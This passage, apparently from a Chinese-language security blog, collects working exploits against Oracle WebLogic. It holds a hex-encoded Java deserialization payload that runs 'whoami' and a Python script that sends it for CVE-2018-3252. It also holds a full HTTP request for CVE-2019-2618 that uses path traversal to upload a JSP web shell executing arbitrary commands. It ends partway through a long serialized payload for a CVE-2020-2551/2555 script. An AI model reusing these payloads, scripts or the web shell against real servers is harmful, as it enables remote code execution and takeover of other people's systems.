&quot;737200176A6176612E7574696C2E4C696E6B656448617368536574D86CD75A95DD2A1E02000077020000787200116A6176612E7574696C2E48617368536574BA44859596B8B734030000770200007870770C000000103F400000000000027372003A636F6D2E73756E2E6F72672E6170616368652E78616C616E2E696E7465726E616C2E78736C74632E747261782E54656D706C61746573496D706C09574FC16EACAB3303000849000D5F696E64656E744E756D62657249000E5F7472616E736C6574496E6465785A00155F75736553657276696365734D656368616E69736D4C000B5F617578436C617373657374003B4C636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F72756E74696D652F486173687461626C653B5B000A5F62797465636F6465737400035B5B425B00065F636C6173737400125B4C6A6176612F6C616E672F436C6173733B4C00055F6E616D657400124C6A6176612F6C616E672F537472696E673B4C00115F6F757470757450726F706572746965737400164C6A6176612F7574696C2F50726F706572746965733B77020000787000000000FFFFFFFF0070757200035B5B424BFD19156767DB3702000077020000787000000002757200025B42ACF317F8060854E002000077020000787000000698CAFEBABE0000003200390A0003002207003707002507002601001073657269616C56657273696F6E5549440100014A01000D436F6E7374616E7456616C756505AD2093F391DDEF3E0100063C696E69743E010003282956010004436F646501000F4C696E654E756D6265725461626C650100124C6F63616C5661726961626C655461626C6501000474686973010013537475625472616E736C65745061796C6F616401000C496E6E6572436C61737365730100354C79736F73657269616C2F7061796C6F6164732F7574696C2F4761646765747324537475625472616E736C65745061796C6F61643B0100097472616E73666F726D010072284C636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F444F4D3B5B4C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F73657269616C697A65722F53657269616C697A6174696F6E48616E646C65723B2956010008646F63756D656E7401002D4C636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F444F4D3B01000868616E646C6572730100425B4C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F73657269616C697A65722F53657269616C697A6174696F6E48616E646C65723B01000A457863657074696F6E730700270100A6284C636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F444F4D3B4C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F64746D2F44544D417869734974657261746F723B4C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F73657269616C697A65722F53657269616C697A6174696F6E48616E646C65723B29560100086974657261746F720100354C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F64746D2F44544D417869734974657261746F723B01000768616E646C65720100414C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F73657269616C697A65722F53657269616C697A6174696F6E48616E646C65723B01000A536F7572636546696C6501000C476164676574732E6A6176610C000A000B07002801003379736F73657269616C2F7061796C6F6164732F7574696C2F4761646765747324537475625472616E736C65745061796C6F6164010040636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F72756E74696D652F41627374726163745472616E736C65740100146A6176612F696F2F53657269616C697A61626C65010039636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F5472616E736C6574457863657074696F6E01001F79736F73657269616C2F7061796C6F6164732F7574696C2F476164676574730100083C636C696E69743E0100116A6176612F6C616E672F52756E74696D6507002A01000A67657452756E74696D6501001528294C6A6176612F6C616E672F52756E74696D653B0C002C002D0A002B002E01000677686F616D6908003001000465786563010027284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F50726F636573733B0C003200330A002B003401000D537461636B4D61705461626C6501001C79736F73657269616C2F50776E65723632353135343430393532373501001E4C79736F73657269616C2F50776E6572363235313534343039353237353B002100020003000100040001001A000500060001000700000002000800040001000A000B0001000C0000002F00010001000000052AB70001B100000002000D0000000600010000002E000E0000000C000100000005000F003800000001001300140002000C0000003F0000000300000001B100000002000D00000006000100000033000E00000020000300000001000F0038000000000001001500160001000000010017001800020019000000040001001A00010013001B0002000C000000490000000400000001B100000002000D00000006000100000037000E0000002A000400000001000F003800000000000100150016000100000001001C001D000200000001001E001F00030019000000040001001A00080029000B0001000C00000024000300020000000FA70003014CB8002F1231B6003557B1000000010036000000030001030002002000000002002100110000000A000100020023001000097571007E000C000001D4CAFEBABE00000032001B0A0003001507001707001807001901001073657269616C56657273696F6E5549440100014A01000D436F6E7374616E7456616C75650571E669EE3C6D47180100063C696E69743E010003282956010004436F646501000F4C696E654E756D6265725461626C650100124C6F63616C5661726961626C655461626C6501000474686973010003466F6F01000C496E6E6572436C61737365730100254C79736F73657269616C2F7061796C6F6164732F7574696C2F4761646765747324466F6F3B01000A536F7572636546696C6501000C476164676574732E6A6176610C000A000B07001A01002379736F73657269616C2F7061796C6F6164732F7574696C2F4761646765747324466F6F0100106A6176612F6C616E672F4F626A6563740100146A6176612F696F2F53657269616C697A61626C6501001F79736F73657269616C2F7061796C6F6164732F7574696C2F47616467657473002100020003000100040001001A000500060001000700000002000800010001000A000B0001000C0000002F00010001000000052AB70001B100000002000D0000000600010000003B000E0000000C000100000005000F001200000002001300000002001400110000000A000100020016001000097074000450776E727077010078737D00000001001D6A617661782E786D6C2E7472616E73666F726D2E54656D706C6174657377020000787200176A6176612E6C616E672E7265666C6563742E50726F7879E127DA20CC1043CB0200014C0001687400254C6A6176612F6C616E672F7265666C6563742F496E766F636174696F6E48616E646C65723B7702000078707372003273756E2E7265666C6563742E616E6E6F746174696F6E2E416E6E6F746174696F6E496E766F636174696F6E48616E646C657255CAF50F15CB7EA50200024C000C6D656D62657256616C75657374000F4C6A6176612F7574696C2F4D61703B4C0004747970657400114C6A6176612F6C616E672F436C6173733B770200007870737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C647702000078703F4000000000000C77080000001000000001740008663561356136303871007E0009787672001D6A617661782E786D6C2E7472616E73666F726D2E54656D706C61746573000000000000000000000077020000787078&quot;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">    return payload.decode(&#39;hex&#39;)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">def send_request(target,username,password):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">    target &#x3D; target + &quot;&#x2F;bea_wls_deployment_internal&#x2F;DeploymentService&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">    header_dict &#x3D; &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">        &#39;User-Agent&#39;:&#39;Mozilla&#x2F;5.0 (Windows NT 6.1; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;69.0.3497.100 Safari&#x2F;537.36&#39;,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">        &quot;wl_request_type&quot;:&quot;data_transfer_request&quot;,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">        &quot;username&quot;: username,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">        &quot;password&quot;: password,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">        &quot;deployment_request_id&quot;: &quot;108911&quot;,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">        &quot;serverName&quot;: &quot;topsec&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">    try:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">        request &#x3D; requests.get(target)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">        if request.status_code &#x3D;&#x3D; 404:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line">            exit(&quot;&#123;&#125; - 404 not found&quot;.format(target))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">28</span></pre></td><td class="code"><pre><span class="line">        else:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">29</span></pre></td><td class="code"><pre><span class="line">            print &quot;\n[*] Start detecting vulnerabilities...\n&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">30</span></pre></td><td class="code"><pre><span class="line">            results &#x3D; requests.post(target, data&#x3D;payload_module(), headers&#x3D;header_dict).text</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">31</span></pre></td><td class="code"><pre><span class="line">            print results</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">32</span></pre></td><td class="code"><pre><span class="line">            c &#x3D; re.findall(r&#39;to (.+?)&quot;&#39;,results)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">33</span></pre></td><td class="code"><pre><span class="line">            if len(c):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">34</span></pre></td><td class="code"><pre><span class="line">                if c[0] &#x3D;&#x3D; &quot;weblogic.deploy.service.DataTransferRequest&quot;:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">35</span></pre></td><td class="code"><pre><span class="line">                    print &quot;[+] &#123;&#125; - exists CVE-2018-3252&quot;.format(target)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">36</span></pre></td><td class="code"><pre><span class="line">            else:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">37</span></pre></td><td class="code"><pre><span class="line">                print &quot;[-] &#123;&#125; - don&#39;t exists CVE-2018-3252&quot;.format(target)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">38</span></pre></td><td class="code"><pre><span class="line">    except requests.ConnectionError:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">39</span></pre></td><td class="code"><pre><span class="line">        exit(&quot;[-] Cannot connect url: &#123;&#125;&quot;.format(target))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">40</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">41</span></pre></td><td class="code"><pre><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">42</span></pre></td><td class="code"><pre><span class="line">    if len(sys.argv) &lt; 2:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">43</span></pre></td><td class="code"><pre><span class="line">        print &quot;\n\tWebLogic DeploymentService 反序列化漏洞检测工具&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">44</span></pre></td><td class="code"><pre><span class="line">        print &quot;\t\t\tCVEID: CVE-2018-3252&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">45</span></pre></td><td class="code"><pre><span class="line">        print &quot;\nUsage: python CVE-2018-3252 http:&#x2F;&#x2F;localhost:7001 username password&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">46</span></pre></td><td class="code"><pre><span class="line">        exit(-1)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">47</span></pre></td><td class="code"><pre><span class="line">    else:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">48</span></pre></td><td class="code"><pre><span class="line">        target &#x3D; sys.argv[1]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">49</span></pre></td><td class="code"><pre><span class="line">        username &#x3D; sys.argv[2]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">50</span></pre></td><td class="code"><pre><span class="line">        password &#x3D; sys.argv[3]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">51</span></pre></td><td class="code"><pre><span class="line">        send_request(target,username,password)</span></pre></td></tr></table></figure><h1 id="Weblogic-任意文件上传漏洞-需要账户密码-（cve-2019-2618）"><a href="#Weblogic-任意文件上传漏洞-需要账户密码-（cve-2019-2618）" class="headerlink" title="Weblogic 任意文件上传漏洞 (需要账户密码)（cve-2019-2618）"></a>Weblogic 任意文件上传漏洞 (需要账户密码)（cve-2019-2618）</h1><h2 id="veriosn"><a href="#veriosn" class="headerlink" title="veriosn"></a>veriosn</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">10.3.6.0</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">12.1.3.0</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">12.2.1.3</span></pre></td></tr></table></figure><h2 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h2><p>知道账号密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">POST &#x2F;bea_wls_deployment_internal&#x2F;DeploymentService HTTP&#x2F;1.1</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">Host: 192.168.119.130:7001</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">Connection: close</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">Accept-Encoding: gzip, deflate</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">Accept: *&#x2F;*</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">User-Agent: python-requests&#x2F;2.21.0</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">username: weblogic</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">wl_request_type: app_upload</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">cache-control: no-cache</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">wl_upload_application_name: &#x2F;..&#x2F;tmp&#x2F;_WL_internal&#x2F;bea_wls_internal&#x2F;9j4dqk&#x2F;war</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">serverName: weblogic</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">password: yourpassword</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">content-type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundary7MA4YWxkTrZu0gW</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">archive: true</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">server_version: 10.3.6.0</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">wl_upload_delta: true</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">Content-Length: 1081</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundary7MA4YWxkTrZu0gW</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;shell.jsp&quot;; filename&#x3D;&quot;shell.jsp&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">Content-Type: false</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">&lt;%@ page import&#x3D;&quot;java.util.*,java.io.*&quot;%&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">&lt;%</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">%&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">&lt;HTML&gt;&lt;BODY&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line">Commands with JSP</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">28</span></pre></td><td class="code"><pre><span class="line">&lt;FORM METHOD&#x3D;&quot;GET&quot; NAME&#x3D;&quot;myform&quot; ACTION&#x3D;&quot;&quot;&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">29</span></pre></td><td class="code"><pre><span class="line">&lt;INPUT TYPE&#x3D;&quot;text&quot; NAME&#x3D;&quot;cmd&quot;&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">30</span></pre></td><td class="code"><pre><span class="line">&lt;INPUT TYPE&#x3D;&quot;submit&quot; VALUE&#x3D;&quot;Send&quot;&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">31</span></pre></td><td class="code"><pre><span class="line">&lt;&#x2F;FORM&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">32</span></pre></td><td class="code"><pre><span class="line">&lt;pre&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">33</span></pre></td><td class="code"><pre><span class="line">&lt;%</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">34</span></pre></td><td class="code"><pre><span class="line">if (request.getParameter(&quot;cmd&quot;) !&#x3D; null) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">35</span></pre></td><td class="code"><pre><span class="line">    out.println(&quot;Command: &quot; + request.getParameter(&quot;cmd&quot;) + &quot;&lt;BR&gt;&quot;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">36</span></pre></td><td class="code"><pre><span class="line">    Process p;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">37</span></pre></td><td class="code"><pre><span class="line">    if ( System.getProperty(&quot;os.name&quot;).toLowerCase().indexOf(&quot;windows&quot;) !&#x3D; -1)&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">38</span></pre></td><td class="code"><pre><span class="line">        p &#x3D; Runtime.getRuntime().exec(&quot;cmd.exe &#x2F;C &quot; + request.getParameter(&quot;cmd&quot;));</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">39</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">40</span></pre></td><td class="code"><pre><span class="line">    else&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">41</span></pre></td><td class="code"><pre><span class="line">        p &#x3D; Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">42</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">43</span></pre></td><td class="code"><pre><span class="line">    OutputStream os &#x3D; p.getOutputStream();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">44</span></pre></td><td class="code"><pre><span class="line">    InputStream in &#x3D; p.getInputStream();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">45</span></pre></td><td class="code"><pre><span class="line">    DataInputStream dis &#x3D; new DataInputStream(in);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">46</span></pre></td><td class="code"><pre><span class="line">    String disr &#x3D; dis.readLine();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">47</span></pre></td><td class="code"><pre><span class="line">    while ( disr !&#x3D; null ) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">48</span></pre></td><td class="code"><pre><span class="line">    out.println(disr);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">49</span></pre></td><td class="code"><pre><span class="line">    disr &#x3D; dis.readLine();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">50</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">51</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">52</span></pre></td><td class="code"><pre><span class="line">%&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">53</span></pre></td><td class="code"><pre><span class="line">&lt;&#x2F;pre&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">54</span></pre></td><td class="code"><pre><span class="line">&lt;&#x2F;BODY&gt;&lt;&#x2F;HTML&gt; </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">55</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">56</span></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundary7MA4YWxkTrZu0gW--</span></pre></td></tr></table></figure><h1 id="Weblogic-IIOP-反序列化漏洞检测脚本（cve-2020-2551）"><a href="#Weblogic-IIOP-反序列化漏洞检测脚本（cve-2020-2551）" class="headerlink" title="Weblogic IIOP 反序列化漏洞检测脚本（cve-2020-2551）"></a>Weblogic IIOP 反序列化漏洞检测脚本（cve-2020-2551）</h1><h2 id="version-5"><a href="#version-5" class="headerlink" title="version"></a>version</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">10.3.6.0.0</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">12.1.3.0.0</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">12.2.1.3.0</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">12.2.1.4.0</span></pre></td></tr></table></figure><h2 id="检测-1"><a href="#检测-1" class="headerlink" title="检测"></a>检测</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"># from:https:&#x2F;&#x2F;github.com&#x2F;zhzyker&#x2F;exphub</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">import socket</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">import time</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">import ssl</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">import binascii</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">import urlparse</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">import argparse</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">import sys</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">globalProxies &#x3D; &#123;&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">header &#x3D; &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">    &#39;User-Agent&#39;: &quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko&#x2F;20100101 Firefox&#x2F;71.0&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">def parseUrl(url):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">    parsed &#x3D; urlparse.urlparse(url)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">    proto &#x3D; parsed.scheme</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">    netloc &#x3D; parsed.netloc</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">    ip &#x3D; netloc</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">    if proto &#x3D;&#x3D; &#39;http&#39;:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">        port &#x3D; 80</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">    else:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line">        port &#x3D; 443</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">28</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">29</span></pre></td><td class="code"><pre><span class="line">    if (&#39;:&#39; in netloc):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">30</span></pre></td><td class="code"><pre><span class="line">        ip &#x3D; netloc.split(&#39;:&#39;)[0]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">31</span></pre></td><td class="code"><pre><span class="line">        port &#x3D; netloc.split(&#39;:&#39;)[1]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">32</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">33</span></pre></td><td class="code"><pre><span class="line">    uri &#x3D; parsed.path</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">34</span></pre></td><td class="code"><pre><span class="line">    return (proto, ip, port, uri)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">35</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">36</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">37</span></pre></td><td class="code"><pre><span class="line">def CVE_2020_2555(cmd):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">38</span></pre></td><td class="code"><pre><span class="line">    payload_start &#x3D; &#39;aced00057372002e6a617661782e6d616e6167656d656e742e42616441747472696275746556616c7565457870457863657074696f6ed4e7daab632d46400200014c000376616c7400124c6a6176612f6c616e672f4f626a6563743b787200136a6176612e6c616e672e457863657074696f6ed0fd1f3e1a3b1cc4020000787200136a6176612e6c616e672e5468726f7761626c65d5c635273977b8cb0300044c000563617573657400154c6a6176612f6c616e672f5468726f7761626c653b4c000d64657461696c4d6573736167657400124c6a6176612f6c616e672f537472696e673b5b000a737461636b547261636574001e5b4c6a6176612f6c616e672f537461636b5472616365456c656d656e743b4c001473757070726573736564457863657074696f6e737400104c6a6176612f7574696c2f4c6973743b787071007e0008707572001e5b4c6a6176612e6c616e672e537461636b5472616365456c656d656e743b02462a3c3cfd22390200007870000000037372001b6a6176612e6c616e672e537461636b5472616365456c656d656e746109c59a2636dd8502000449000a6c696e654e756d6265724c000e6465636c6172696e67436c61737371007e00054c000866696c654e616d6571007e00054c000a6d6574686f644e616d6571007e000578700000004374002079736f73657269616c2e7061796c6f6164732e4356455f323032305f323535357400124356455f323032305f323535352e6a6176617400096765744f626a6563747371007e000b0000000171007e000d71007e000e71007e000f7371007e000b0000002274001979736f73657269616c2e47656e65726174655061796c6f616474001447656e65726174655061796c6f61642e6a6176617400046d61696e737200266a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c654c697374fc0f2531b5ec8e100200014c00046c69737471007e00077872002c6a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c65436f6c6c656374696f6e19420080cb5ef71e0200014c0001637400164c6a6176612f7574696c2f436f6c6c656374696f6e3b7870737200136a6176612e7574696c2e41727261794c6973747881d21d99c7619d03000149000473697a657870000000007704000000007871007e001a7873720024636f6d2e74616e676f736f6c2e7574696c2e66696c7465722e4c696d697446696c74657299022596d7b4595302000649000b6d5f635061676553697a654900076d5f6e506167654c000c6d5f636f6d70617261746f727400164c6a6176612f7574696c2f436f6d70617261746f723b4c00086d5f66696c74657274001a4c636f6d2f74616e676f736f6c2f7574696c2f46696c7465723b4c000f6d5f6f416e63686f72426f74746f6d71007e00014c000c6d5f6f416e63686f72546f7071007e0001787000000000000000007372002c636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e436861696e6564457874726163746f72889f81b0945d5b7f02000078720036636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e4162737472616374436f6d706f73697465457874726163746f72086b3d8c05690f440200015b000c6d5f61457874726163746f727400235b4c636f6d2f74616e676f736f6c2f7574696c2f56616c7565457874726163746f723b7872002d636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e4162737472616374457874726163746f72658195303e7238210200014900